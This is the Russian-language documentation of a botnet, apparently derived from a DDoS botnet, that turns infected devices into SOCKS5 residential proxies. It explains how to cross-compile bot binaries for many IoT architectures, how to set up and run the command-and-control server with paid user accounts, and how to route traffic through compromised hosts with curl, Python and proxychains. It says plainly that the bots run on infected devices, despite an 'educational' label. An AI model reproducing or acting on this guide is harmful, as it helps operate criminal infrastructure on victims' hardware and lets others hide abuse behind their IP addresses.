# Residential Proxy Botnet - Documentation

## Изменения в проекте

Этот проект был преобразован из DDoS ботнета в **систему резидентских прокси** для образовательных целей.

### Что было удалено:
- ✅ Все модули DDoS атак (`attack_tcp.c`, `attack_udp.c`)
- ✅ Все методы атак (SYN flood, UDP flood, ACK flood, и т.д.)
- ✅ Функции генерации атакующего трафика

### Что было добавлено:
- ✅ **SOCKS5 прокси-сервер** (`bot/proxy.c`, `bot/proxy.h`)
- ✅ Поддержка аутентификации (username/password)
- ✅ Автоматический запуск прокси при старте бота
- ✅ Управление через CNC сервер

## Архитектура

### Бот (proxy.c)
Каждый бот работает как SOCKS5 прокси-сервер:
- **Порт по умолчанию**: 1080
- **Протокол**: SOCKS5
- **Максимум клиентов**: 256 одновременных подключений
- **Таймаут**: 300 секунд (5 минут)

### Возможности:
1. **SOCKS5 handshake** - полная поддержка протокола
2. **Аутентификация** - опциональная username/password аутентификация
3. **IPv4 и Domain** - поддержка CONNECT к IP адресам и доменным именам
4. **Access Control** - фильтрация локальных и приватных сетей
5. **Relay** - эффективная пересылка данных между клиентом и целью

## Использование

### Сборка ботов
```bash
chmod +x build.sh
./build.sh
```

Скомпилированные бинарники будут в папке `./release/` для разных архитектур:
- main_x86, main_x86_64
- main_mips, main_mpsl  
- main_arm, main_arm5, main_arm6, main_arm7
- main_ppc, main_m68k, main_sh4, main_spc

### Подключение к боту как прокси

После того как бот запущен на зараженном устройстве, можно подключиться к нему как к SOCKS5 прокси:

```python
import requests

proxies = {
    'http': 'socks5://bot_ip:1080',
    'https': 'socks5://bot_ip:1080'
}

response = requests.get('http://example.com', proxies=proxies)
```

```bash
# Через curl
curl -x socks5://bot_ip:1080 http://example.com

# Через proxychains
# Добавить в /etc/proxychains.conf:
# socks5 bot_ip 1080
proxychains4 curl http://example.com
```

### Настройка CNC сервера

1. Настроить базу данных SQLite:
```bash
cd assets
sqlite3 data.sql < schema.sql
```

2. Настроить конфигурацию в `assets/server.toml`:
```toml
[server]
bot_port = 1995      # Порт для подключения ботов
admin_port = 23      # Порт для админ панели

[proxy]
default_port = 1080  # Порт прокси по умолчанию
require_auth = false # Требовать аутентификацию
```

3. Запустить CNC:
```bash
# Если собирали Go сервер
go build cnc/*.go
./admin

# Или используйте скрипт
screen ./admin
```

### Управление через CNC

После подключения к CNC админ панели (telnet localhost 23):

```
# Просмотр подключенных ботов
bots

# Просмотр списка команд
help

# Управление пользователями
users
create <username> <password> <days>
remove <username>
```

## Безопасность

### Access Control (proxy.c)
Прокси автоматически блокирует:
- 127.0.0.0/8 (localhost)
- 10.0.0.0/8 (приватная сеть)
- 172.16.0.0/12 (приватная сеть)
- 192.168.0.0/16 (приватная сеть)

### Функция `proxy_check_access()`:
```c
BOOL proxy_check_access(uint32_t target_ip, uint16_t target_port)
{
    // Block localhost
    if ((target_ip & 0xFF) == 127)
        return FALSE;
    
    // Block private networks
    // ... дополнительные проверки
    
    return TRUE;
}
```

## Протокол SOCKS5

### Handshake:
1. Client -> Server: VERSION | NMETHODS | METHODS
2. Server -> Client: VERSION | METHOD
3. (Опционально) Аутентификация
4. Client -> Server: CONNECT request
5. Server -> Client: CONNECT response
6. Relay данных

### Поддерживаемые команды:
- ✅ CONNECT (0x01)
- ❌ BIND (0x02) - не реализовано
- ❌ UDP ASSOCIATE (0x03) - не реализовано

### Типы адресов:
- ✅ IPv4 (0x01)
- ✅ Domain name (0x03)
- ❌ IPv6 (0x04) - не реализовано

## Технические детали

### Многопоточность
- Главный процесс управляет CNC подключением
- Дочерний процесс (`proxy_pid`) запускает SOCKS5 сервер
- Используется `select()` для неблокирующего I/O

### Буферизация
